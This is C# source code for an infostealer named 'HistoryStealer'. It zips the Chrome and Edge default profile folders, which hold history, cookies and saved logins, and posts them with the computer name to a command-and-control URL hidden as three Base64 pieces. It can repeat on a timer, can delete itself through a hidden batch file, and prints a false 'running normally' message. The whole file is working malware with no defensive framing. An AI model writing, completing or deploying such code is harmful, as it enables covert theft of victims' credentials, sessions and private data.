using System;
using System.IO;
using System.IO.Compression;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using System.Text; // Add this for Base64 encoding/decoding

namespace HistoryStealer
{
    public class Config
    {
        // Split C2Url into three unequal parts and Base64 encode them
        private static readonly string C2Part1 = "BASE64_PART1_PLACEHOLDER"; // First part
        private static readonly string C2Part2 = "BASE64_PART2_PLACEHOLDER"; // Second part
        private static readonly string C2Part3 = "BASE64_PART3_PLACEHOLDER"; // Third part

        // Property to reconstruct the full URL at runtime
        public static string C2Url
        {
            get
            {
                // Decode each part and concatenate
                byte[] part1Bytes = Convert.FromBase64String(C2Part1);
                byte[] part2Bytes = Convert.FromBase64String(C2Part2);
                byte[] part3Bytes = Convert.FromBase64String(C2Part3);
                return Encoding.UTF8.GetString(part1Bytes) + 
                       Encoding.UTF8.GetString(part2Bytes) + 
                       Encoding.UTF8.GetString(part3Bytes);
            }
        }

        public static readonly string ChromePath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            @"Google\Chrome\User Data\Default");
        public static readonly string EdgePath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            @"Microsoft\Edge\User Data\Default");
        public static readonly string TempZipPath = Path.Combine(Path.GetTempPath(), "browser_data.zip");
        public static readonly string Target = "BOTH";
        public static readonly int Hours = 0;
        public static readonly bool SelfDestruct = false;
    }

    // Rest of the code remains unchanged
    public class BrowserDataZipper
    {
        public static void CreateZip()
        {
            if (File.Exists(Config.TempZipPath))
                File.Delete(Config.TempZipPath);

            string tempFolder = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
            Directory.CreateDirectory(tempFolder);

            try
            {
                using (var zip = ZipFile.Open(Config.TempZipPath, ZipArchiveMode.Create))
                {
                    if (Config.Target == "CHROME" || Config.Target == "BOTH")
                        AddFolderToZip(zip, Config.ChromePath, "chrome", tempFolder);
                    if (Config.Target == "EDGE" || Config.Target == "BOTH")
                        AddFolderToZip(zip, Config.EdgePath, "edge", tempFolder);
                }
            }
            finally
            {
                Directory.Delete(tempFolder, true);
            }
        }

        private static void AddFolderToZip(ZipArchive zip, string folderPath, string entryPrefix, string tempFolder)
        {
            if (!Directory.Exists(folderPath))
                return;

            foreach (var file in Directory.GetFiles(folderPath))
            {
                string tempFile = Path.Combine(tempFolder, Path.GetFileName(file));
                try
                {
                    File.Copy(file, tempFile, true);
                    zip.CreateEntryFromFile(tempFile, Path.Combine(entryPrefix, Path.GetFileName(file)));
                }
                catch (IOException)
                {
                }
                finally
                {
                    if (File.Exists(tempFile))
                        File.Delete(tempFile);
                }
            }
        }
    }

    public class Uploader
    {
        private static readonly HttpClient client = new HttpClient();

        public static async Task UploadZipAsync(string computerName)
        {
            if (!File.Exists(Config.TempZipPath))
                return;

            try
            {
                using (var content = new MultipartFormDataContent())
                {
                    content.Add(new StringContent(computerName), "computer_name");

                    var fileContent = new ByteArrayContent(File.ReadAllBytes(Config.TempZipPath));
                    fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/zip");
                    content.Add(fileContent, "file", "browser_data.zip");

                    await client.PostAsync(Config.C2Url, content);
                }
            }
            catch (Exception)
            {
            }
            finally
            {
                if (File.Exists(Config.TempZipPath))
                    File.Delete(Config.TempZipPath);
            }
        }
    }

    public class SelfDestruct
    {
        public static void DeleteSelf()
        {
            try
            {
                string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                string batchFile = Path.Combine(Path.GetTempPath(), "delete.bat");
                File.WriteAllText(batchFile, 
                    $"@echo off\n" +
                    $"ping 127.0.0.1 -n 2 > nul\n" +
                    $"del \"{exePath}\"\n" +
                    $"del \"%~f0\"");
                
                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
                {
                    FileName = batchFile,
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
            }
            catch (Exception)
            {
            }
        }
    }

    class Program
    {
        static void Main(string[] args)
        {
            MainAsync().GetAwaiter().GetResult();
        }

        static async Task MainAsync()
        {
            do
            {
                BrowserDataZipper.CreateZip();
                await Uploader.UploadZipAsync(Environment.MachineName);
                if (Config.SelfDestruct)
                {
                    SelfDestruct.DeleteSelf();
                    break;
                }
                if (Config.Hours > 0)
                    await Task.Delay(Config.Hours * 60 * 60 * 1000);
            } while (Config.Hours > 0);
            Console.WriteLine("Program running normally.");
        }
    }
}